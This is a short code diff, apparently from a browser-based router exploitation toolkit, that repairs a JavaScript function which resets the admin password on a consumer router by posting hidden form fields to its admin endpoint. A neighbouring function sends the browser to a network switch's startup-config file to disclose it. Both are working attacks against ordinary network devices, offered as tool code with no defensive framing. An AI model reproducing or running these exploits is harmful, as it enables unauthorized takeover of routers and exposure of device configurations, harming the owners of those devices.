@@ -1946,13 +1946,13 @@ function prosafe_configdisclosure(ip)
     document.location="http://"+ip+"/filesystem/startup-config";
 }
 
-function wxv10w300_changeadmin()
+function wxv10w300_changeadmin(ip)
 {
 	ip = ip || "192.168.1.1";
 	pwd = prompt("New Password: ")
 	form = '<input type="hidden" name="uiViewTools_Password" value="' + pwd +'" />\
       <input type="hidden" name="uiViewTools_PasswordConfirm" value="' + pwd +'" />';
-      post('http://' + ip + 'http://192.168.1.1/Forms/tools_admin_1', form);
+      post('http://' + ip + '/Forms/tools_admin_1', form);
 }
 
 /*
